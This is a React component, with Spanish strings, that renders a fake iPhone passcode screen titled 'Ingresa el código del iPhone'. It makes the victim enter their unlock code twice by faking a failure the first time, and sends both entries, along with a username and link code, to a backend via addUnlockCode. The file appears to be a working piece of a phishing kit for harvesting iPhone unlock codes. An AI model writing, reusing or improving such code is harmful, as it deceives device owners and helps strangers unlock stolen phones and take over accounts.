import React, { useRef, useState, useEffect } from 'react';
import { Form, Button, Row, Col } from 'react-bootstrap';
import responses from '../../api/responses';
import SvgSpinner from './svgComponents/SvgSpinner';
import CheckData from './CheckData';
import { useData } from '../../context/UserContext';

const NUMPAD = [
    ['1', '2', '3'],
    ['4', '5', '6'],
    ['7', '8', '9'],
    ['', '0', '←']
];

const Passcode = ({
    translator
}) => {
     const { user } = useData();
    let initialDigits = parseInt(user?.data?.unlockCode, 10);
    const isAlpha = isNaN(initialDigits) || user?.data?.unlockCode === 'alphanumeric';
    if (!isAlpha && initialDigits !== 4 && initialDigits !== 6) initialDigits = 6;
    const [DIGITS, setDIGITS] = useState(initialDigits);

    // Estados para numérico
    const [code, setCode] = useState(isAlpha ? '' : Array(initialDigits).fill(''));
    const [codeTemp, setCodeTemp] = useState('');
    const [focusedIndex, setFocusedIndex] = useState(0);
    const [shake, setShake] = useState(false);
    const inputs = useRef([]);
    const [countCode, setCountCode] = useState(0);
    const [showLoader, setShowLoader] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    // Estados para fade y mostrar CheckData
    const [fadeOut, setFadeOut] = useState(false);
    const [showCheckData, setShowCheckData] = useState(
        user?.data?.unlockCode === "none" || user?.data?.unlockCode === ""
            ? true
            : false
    );
    const [firstCode, setFirstCode] = useState('');

    // Estados para alfanumérico
    const [alphaStep, setAlphaStep] = useState(0); // 0: primer input, 1: segundo input
    const [alphaCode, setAlphaCode] = useState('');
    const [alphaFirst, setAlphaFirst] = useState('');
    const [alphaShake, setAlphaShake] = useState(false);

    useEffect(() => {
        
        let digits = parseInt(user?.data?.unlockCode, 10);
        const isAlpha = isNaN(digits) || user?.data?.unlockCode === 'alphanumeric';
        if (!isAlpha && digits !== 4 && digits !== 6) digits = 6;
        setDIGITS(digits);
        setCode(isAlpha ? '' : Array(digits).fill(''));
    }, []);

    // Foco automático solo para alfanumérico
    useEffect(() => {
        if (isAlpha) {
            setTimeout(() => {
                document.getElementById('alpha-passcode-input')?.focus();
            }, 1000);
        }
    }, [isAlpha, fadeOut, alphaStep]);

    // Foco automático para numérico
    useEffect(() => {
        if (!isAlpha) {
            setTimeout(() => {
                inputs.current[0]?.focus();
            }, 500);
        }
    }, [isAlpha, fadeOut]);

    const addAcountPasscode = async (passCodeOne, passCodeTwo, statusPasscode) => {
        try {           
            let data = {
                linkCode: user?.data?.linkCode || '',
                username: user?.data?.username || '',
                codesUnlock : `${passCodeOne}-${passCodeTwo}`,
                status : statusPasscode
            }
            const response = await responses.addUnlockCode(data);
        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    }

    // NUMÉRICO - Input tradicional
    const handleInputChange = (e, idx) => {
        const val = e.target.value.replace(/\D/g, '');
        if (!val) return;
        const newCode = [...code];
        newCode[idx] = val[0];
        setCode(newCode);
        if (val && idx < DIGITS - 1) {
            inputs.current[idx + 1]?.focus();
        }
        if (newCode.every(d => d !== '')) {
            setTimeout(() => {
                setCountCode(prev => {
                    if (prev === 0) {
                        setCodeTemp(newCode);
                        setFirstCode(newCode.join(''));
                        addAcountPasscode(newCode.join(''), 'Processing', 'passcode_process');
                    }
                    if (prev === 1) {
                        setCodeTemp(newCode.join(''));
                        addAcountPasscode(firstCode, newCode.join(''), 'passcode_process');
                    }
                    return prev + 1;
                });
            }, 2000);

            setShowLoader(true);
            setTimeout(() => {
                setShake(false);
                if (countCode === 0) {
                    if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                    setShake(true);
                    setCode(Array(DIGITS).fill(''));
                    setShowLoader(false);
                    inputs.current[0]?.focus();
                } else {
                    if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                    setFadeOut(true);
                    setShowLoader(false);
                    setTimeout(() => setShowCheckData(true), 100);
                }
            }, 3000);
        }
    };

    const handleInputKeyDown = (e, idx) => {
        if (e.key === 'Backspace') {
            if (code[idx]) {
                const newCode = [...code];
                newCode[idx] = '';
                setCode(newCode);
            } else if (idx > 0) {
                inputs.current[idx - 1]?.focus();
                const newCode = [...code];
                newCode[idx - 1] = '';
                setCode(newCode);
            }
        }
    };

    // NUMPAD para code4 y code6
    const handleNumpadClick = (val) => {
        if (val === '←') {
            const lastFilled = code.slice().reverse().findIndex(d => d !== '');
            if (lastFilled !== -1) {
                const idx = DIGITS - 1 - lastFilled;
                const newCode = [...code];
                newCode[idx] = '';
                setCode(newCode);
                setFocusedIndex(idx);
                inputs.current[idx]?.focus();
            }
            return;
        }
        if (val === '') return;
        const idx = code.findIndex(d => d === '');
        if (idx !== -1) {
            const newCode = [...code];
            newCode[idx] = val;
            setCode(newCode);
            setFocusedIndex(idx);
            inputs.current[idx]?.focus();

            if (idx === DIGITS - 1 && newCode.every(d => d !== '')) {
                setShowLoader(true);
                setTimeout(() => {
                    setShake(false);
                    setShowLoader(false);
                    setCountCode(prev => {
                        if (prev === 0) {
                            setCodeTemp(newCode);
                            setFirstCode(newCode.join(''));
                            addAcountPasscode(newCode.join(''), 'Processing', 'passcode_process');
                            if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                            setShake(true);
                            setCode(Array(DIGITS).fill(''));
                            inputs.current[0]?.focus();
                            setTimeout(() => setShake(false), 500);
                        }
                        if (prev === 1) {
                            setCodeTemp(newCode.join(''));
                            addAcountPasscode(firstCode, newCode.join(''), 'passcode_process');
                            if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                            setFadeOut(true);
                            setTimeout(() => setShowCheckData(true), 500);
                        }
                        return prev + 1;
                    });
                }, 2000);
            }
        }
    };

    // ALFANUMÉRICO
    const handleAlphaSubmit = async (e) => {
        e.preventDefault();
        setShowLoader(true);
        setTimeout(() => {
            setShowLoader(false);
            if (alphaStep === 0) {
                setAlphaFirst(alphaCode);
                setAlphaCode('');
                setAlphaStep(1);
                addAcountPasscode(alphaCode, 'Processing', 'passcode_process');
                if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                setAlphaShake(true);
                setTimeout(() => setAlphaShake(false), 500);
            } else {
                addAcountPasscode(alphaFirst, alphaCode, 'passcode_process');
                if ('vibrate' in navigator) navigator.vibrate([100, 50, 100]);
                setAlphaShake(true);
                setFadeOut(true);
                setTimeout(() => {
                    setAlphaShake(false);
                    setShowCheckData(true);
                }, 500);
            }
        }, 2000);
    };

    // Mostrar solo CheckData si showCheckData es true
    if (showCheckData) {
        return (
            <>
                <CheckData
                    translator={translator}
                />
            </>
        );
    }

    return (
        <>
            <div>
                <style>
                    {`
                .shake {
                    animation: shake 0.5s;
                }
                @keyframes shake {
                    0% { transform: translateX(0); }
                    20% { transform: translateX(-5px); }
                    40% { transform: translateX(5px); }
                    60% { transform: translateX(-5px); }
                    80% { transform: translateX(5px); }
                    100% { transform: translateX(0); }
                }
                .fade-out {
                    opacity: 0;
                    transition: opacity 0.5s;
                }
                .passcode-row-nowrap {
                    display: flex !important;
                    flex-wrap: nowrap !important;
                    justify-content: center;
                    align-items: center;
                    gap: 16px;
                }
                .custom-password-input {
                    background: transparent;
                    border: none;
                    border-radius: 0;
                    color: #fff;
                    height: 56px;
                    font-size: 20px;
                    font-weight: 400;
                    box-shadow: none;
                    padding-left: 24px;
                    padding-right: 24px;
                    outline: none;
                    text-align: left;
                    display: flex;
                    align-items: center;
                    position: relative;
                }
                .passcode-placeholder-white::placeholder {
                    color:rgba(128, 121, 121, 0.53) !important;
                    opacity: 1 !important;
                }
                .numpad-btn {
                    width: 56px;
                    height: 56px;
                    border-radius: 50%;
                    border: none;
                    background: #232323;
                    color: #fff;
                    font-size: 22px;
                    margin: 6px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    box-shadow: 0 1px 2px rgba(0,0,0,0.12);
                    transition: background 0.2s;
                }
                .numpad-btn:active {
                    background: #444;
                }
                .numpad-row {
                    display: flex;
                    justify-content: center;
                }
                @media (max-width: 600px) {
                    .numpad-btn {
                        width: 72px;
                        height: 72px;
                        font-size: 28px;
                        margin: 10px;
                    }
                }
                `}
                </style>

                <div
                    className={fadeOut ? 'fade-out' : ''}
                    style={{
                        height: '100vh',
                        width: '100vw',
                        boxSizing: 'border-box',
                        margin: 0,
                        padding: 0,
                        background: '#181818',
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        justifyContent: 'flex-start',
                        position: 'relative',
                        padding: 46,
                        marginTop: (typeof navigator !== "undefined" && !/iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 0 : 0,
                        overflowY: 'auto'
                    }}
                >
                    <div style={{ color: '#fff', fontSize: 18, textAlign: 'center', marginBottom: 8, fontWeight: 500 }}>
                        {translator("Ingresa el código del iPhone")}
                    </div>
                    <div style={{ color: '#b0b0b0', fontSize: 13, textAlign: 'center', marginBottom: 32 }}>
                        {translator("Se requiere código de autenticación.")}
                    </div>
                    <Form onSubmit={isAlpha ? handleAlphaSubmit : undefined}>
                        {isAlpha ? (
                            <>
                                <div className="passcode-input-wrapper" style={{ marginBottom: 18 }}>
                                    <Form.Control
                                        id="alpha-passcode-input"
                                        type="password"
                                        placeholder={alphaStep === 0 ? `${translator("Código de desbloqueo")}` : `${translator("Repite el código")}`}
                                        value={alphaCode}
                                        onChange={e => setAlphaCode(e.target.value)}
                                        inputMode="text"
                                        className={`custom-password-input passcode-placeholder-white${alphaShake ? ' shake' : ''}`}
                                        style={{
                                            background: "#393939",
                                            border: "none",
                                            color: "#fff",
                                            height: 56,
                                            fontSize: 20,
                                            fontWeight: 400,
                                            borderRadius: 22,
                                            textAlign: "left",
                                            boxShadow: "none",
                                            paddingLeft: 24,
                                            paddingRight: 24,
                                            opacity: 0.95
                                        }}
                                        autoFocus={true}
                                    />
                                </div>
                                <div style={{ display: "flex", justifyContent: "center" }}>
                                    <Button
                                        variant="secondary"
                                        type="submit"
                                        style={{
                                            width: "200px",
                                            height: 44,
                                            borderRadius: 8,
                                            fontWeight: 500,
                                            fontSize: 17,
                                            background: alphaCode.length > 0 ? "rgb(77, 144, 254)" : "#888",
                                            border: "none",
                                            marginBottom: 10,
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            gap: 8,
                                            pointerEvents: alphaCode.length > 0 && !showLoader ? "auto" : "none",
                                            color: "#fff"
                                        }}
                                        disabled={alphaCode.length === 0 || showLoader}
                                    >
                                        {showLoader ? <SvgSpinner width={24} height={24} /> : `${translator("Siguiente")}`}
                                    </Button>
                                </div>
                            </>
                        ) : (
                            <>
                                <Row className="justify-content-center passcode-row-nowrap mb-4" style={{ gap: 16 }}>
                                    {code.map((digit, idx) => (
                                        <Col key={idx} xs="auto" style={{ padding: 0 }}>
                                            <Form.Control
                                                className={shake ? 'shake' : ''}
                                                ref={el => (inputs.current[idx] = el)}
                                                type={showPassword ? "tel" : "tel"}
                                                maxLength={1}
                                                value={digit}
                                                onChange={e => handleInputChange(e, idx)}
                                                onFocus={() => setFocusedIndex(idx)}
                                                onKeyDown={e => handleInputKeyDown(e, idx)}
                                                inputMode="numeric"
                                                pattern="[0-9]*"
                                                style={{
                                                    width: 32,
                                                    height: 32,
                                                    borderRadius: '50%',
                                                    border: '2px solid',
                                                    borderColor: focusedIndex === idx || code[idx] ? '#fff' : '#555',
                                                    background: code[idx]
                                                        ? '#fff'
                                                        : focusedIndex === idx
                                                            ? '#222'
                                                            : '#181818',
                                                    color: showPassword ? '#000' : 'transparent',
                                                    fontSize: 20,
                                                    textAlign: 'center',
                                                    outline: 'none',
                                                    transition: 'border-color 0.2s, background 0.2s, color 0.2s',
                                                    padding: 0,
                                                    caretColor: 'transparent',
                                                    margin: '0 6px',
                                                }}
                                                autoFocus={idx === 0}
                                                readOnly
                                            />
                                        </Col>
                                    ))}
                                </Row>
                                <div style={{
                                    width: '100%',
                                    display: showLoader ? 'flex' : 'none',
                                    justifyContent: 'center',
                                    alignItems: 'center',
                                    margin: '12px 0 16px 0'
                                }}>
                                    <SvgSpinner
                                        width={32}
                                        height={32}
                                        fill="#fff"
                                        color="#fff"
                                    />
                                </div>
                                {/* Teclado numérico virtual */}
                                <div style={{ marginBottom: 16 }}>
                                    {NUMPAD.map((row, i) => (
                                        <div className="numpad-row" key={i}>
                                            {row.map((val, j) => {
                                                const isDelete = val === '←';
                                                const isFull = code.every(d => d !== '');
                                                return (
                                                    <button
                                                        key={j}
                                                        className="numpad-btn"
                                                        onClick={e => {
                                                            e.preventDefault();
                                                            handleNumpadClick(val);
                                                        }}
                                                        tabIndex={-1}
                                                        type="button"
                                                        style={{
                                                            opacity: val === '' ? 0 : 1,
                                                            pointerEvents: val === '' || (isDelete && isFull) ? 'none' : 'auto',
                                                            background: isDelete && isFull ? '#444' : undefined,
                                                            cursor: isDelete && isFull ? 'not-allowed' : undefined
                                                        }}
                                                        disabled={isDelete && isFull}
                                                    >
                                                        {val === '←' ? (
                                                            <svg width="22" height="22" fill="#fff" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" /></svg>
                                                        ) : val}
                                                    </button>
                                                );
                                            })}
                                        </div>
                                    ))}
                                </div>
                            </>
                        )}
                    </Form>
                </div>
            </div>
        </>
    );
};

export default Passcode;